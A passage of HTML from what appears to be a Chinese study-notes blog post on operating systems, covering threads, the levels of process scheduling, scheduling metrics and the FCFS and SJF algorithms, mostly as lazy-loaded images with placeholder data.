src="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210620163621302.png" class="lazyload" data-srcset="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210620163621302.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210620163621302" style="zoom:50%;"><h3 id="进程的切换"><a href="#进程的切换" class="headerlink" title="进程的切换"></a>进程的切换</h3><p><img src="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210620163655324.png" class="lazyload" data-srcset="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210620163655324.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210620163655324"></p><p><img src="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210620164459810.png" class="lazyload" data-srcset="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210620164459810.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210620164459810"></p><h1 id="线程的概念"><a href="#线程的概念" class="headerlink" title="线程的概念"></a>线程的概念</h1><h2 id="线程"><a href="#线程" class="headerlink" title="线程"></a>线程</h2><p>线程是一个基本的CPU执行单元，也是<strong>程序执行的最小单位</strong>，引入线程后，不仅进程之间可以并发，进程内的各线程之间也可以并发，从而进一步提升了系统的并发度，使得一个进程内也可以并发处理各种任务。进程只作为<strong>除CPU之外的系统资源</strong>分配单元。</p><h2 id="线程的作用"><a href="#线程的作用" class="headerlink" title="线程的作用"></a>线程的作用</h2><p><img src="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210620165118890.png" class="lazyload" data-srcset="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210620165118890.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210620165118890"></p><h2 id="线程的属性"><a href="#线程的属性" class="headerlink" title="线程的属性"></a>线程的属性</h2><p><img src="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210620165325237.png" class="lazyload" data-srcset="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210620165325237.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210620165325237"></p><h2 id="线程的实现方式"><a href="#线程的实现方式" class="headerlink" title="线程的实现方式"></a>线程的实现方式</h2><h6 id="1-用户级线程（CPU调度单位仍是进程）"><a href="#1-用户级线程（CPU调度单位仍是进程）" class="headerlink" title="1.用户级线程（CPU调度单位仍是进程）"></a>1.用户级线程（CPU调度单位仍是进程）</h6><p><img src="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210620165920251.png" class="lazyload" data-srcset="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210620165920251.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210620165920251"></p><h6 id="2-内核级线程"><a href="#2-内核级线程" class="headerlink" title="2.内核级线程"></a>2.内核级线程</h6><p><img src="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210620170200751.png" class="lazyload" data-srcset="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210620170200751.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210620170200751"></p><h2 id="多线程模型"><a href="#多线程模型" class="headerlink" title="多线程模型"></a>多线程模型</h2><img src="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210620170245974.png" class="lazyload" data-srcset="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210620170245974.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210620170245974" style="zoom:33%;"><img src="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210620170317333.png" class="lazyload" data-srcset="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210620170317333.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210620170317333" style="zoom: 33%;"><img src="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210620170452897.png" class="lazyload" data-srcset="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210620170452897.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210620170452897" style="zoom:33%;"><h1 id="进程的调度、层次"><a href="#进程的调度、层次" class="headerlink" title="进程的调度、层次"></a>进程的调度、层次</h1><h2 id="高级调度"><a href="#高级调度" class="headerlink" title="高级调度"></a>高级调度</h2><p>高级调度：作业调度，按照一定的原则从外存的作业后备队列中挑选一个作业调入内存，并创建进程，每个作业只调入一次，调出一次。作业调入时会建立PCB，调出时才撤销PCB。</p><h2 id="低级调度"><a href="#低级调度" class="headerlink" title="低级调度"></a>低级调度</h2><p>低级调度：进程调度/处理调度，按照某种策略从就绪队列中选取一个进程，将处理机分配给它。</p><p>进程调度是操作系统中最基本的一种调度，在一般操作系统中都必须配置进程调度。</p><h2 id="中级调度"><a href="#中级调度" class="headerlink" title="中级调度"></a>中级调度</h2><p>中级调度：内存调度，按照某种策略决定将哪个处于挂起状态的进程重新调入内存</p><p>暂时调到外存等待的进程状态为挂起状态，被挂起的进程PCB会被组织成挂起队列</p><img src="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210620172050959.png" class="lazyload" data-srcset="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210620172050959.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210620172050959" style="zoom:67%;"><h1 id="七状态模型"><a href="#七状态模型" class="headerlink" title="七状态模型"></a>七状态模型</h1><p><img src="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210620172016677.png" class="lazyload" data-srcset="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210620172016677.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210620172016677"></p><h1 id="进程调度"><a href="#进程调度" class="headerlink" title="进程调度"></a>进程调度</h1><p>进程调度，就是按照某种算法从就绪队列中选择一个进程为其分配处理机</p><p><img src="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210620174800177.png" class="lazyload" data-srcset="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210620174800177.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210620174800177"></p><p><img src="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210620212615809.png" class="lazyload" data-srcset="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210620212615809.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210620212615809"></p><img src="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210620214544295.png" class="lazyload" data-srcset="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210620214544295.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210620214544295" style="zoom:67%;"><p><img src="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210620225909640.png" class="lazyload" data-srcset="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210620225909640.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210620225909640"></p><h1 id="调度算法评价指标"><a href="#调度算法评价指标" class="headerlink" title="调度算法评价指标"></a>调度算法评价指标</h1><h2 id="CPU利用率"><a href="#CPU利用率" class="headerlink" title="CPU利用率"></a>CPU利用率</h2><p><img src="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210620230335650.png" class="lazyload" data-srcset="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210620230335650.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210620230335650"></p><h2 id="系统吞吐量"><a href="#系统吞吐量" class="headerlink" title="系统吞吐量"></a>系统吞吐量</h2><p><img src="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210620230442085.png" class="lazyload" data-srcset="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210620230442085.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210620230442085"></p><h2 id="周转时间"><a href="#周转时间" class="headerlink" title="周转时间"></a>周转时间</h2><p><img src="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210620230618344.png" class="lazyload" data-srcset="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210620230618344.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210620230618344"></p><p><img src="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210620230725076.png" class="lazyload" data-srcset="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210620230725076.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210620230725076"></p><h2 id="等待时间"><a href="#等待时间" class="headerlink" title="等待时间"></a>等待时间</h2><p><img src="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210620230830358.png" class="lazyload" data-srcset="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210620230830358.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210620230830358"></p><h2 id="响应时间"><a href="#响应时间" class="headerlink" title="响应时间"></a>响应时间</h2><p><img src="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210620230916680.png" class="lazyload" data-srcset="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210620230916680.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210620230916680"></p><h2 id><a href="#" class="headerlink" title></a><img src="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210620230940826.png" class="lazyload" data-srcset="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210620230940826.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210620230940826"></h2><h1 id="调度算法"><a href="#调度算法" class="headerlink" title="调度算法"></a>调度算法</h1><h2 id="先来先服务"><a href="#先来先服务" class="headerlink" title="先来先服务"></a>先来先服务</h2><img src="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210620231520019.png" class="lazyload" data-srcset="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210620231520019.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210620231520019" style="zoom: 25%;"><p><img src="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210620231305311.png" class="lazyload" data-srcset="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210620231305311.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210620231305311"></p><h2 id="短作业优先算法-SJF-SPF"><a href="#短作业优先算法-SJF-SPF" class="headerlink" title="短作业优先算法 SJF/SPF"></a>短作业优先算法 SJF/SPF</h2><img src="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210620232145938.png" class="lazyload" data-srcset="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210620232145938.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210620232145938" style="zoom:50%;"><h3 id="非抢占式"><a href="#非抢占式" class="headerlink" title="非抢占式"></a>非抢占式</h3><p><img src="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210620231707798.png" class="lazyload" data-srcset="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210620231707798.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210620231707798"></p><h3 id="抢占式"><a href="#抢占式" class="headerlink" title="抢占式"></a>抢占式</h3><p><img src="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210620231904207.png" class="lazyload" data-srcset="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210620231904207.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210620231904207"></p><p><img src="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210620231917135.png" class="lazyload" data-srcset="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210620231917135.png" 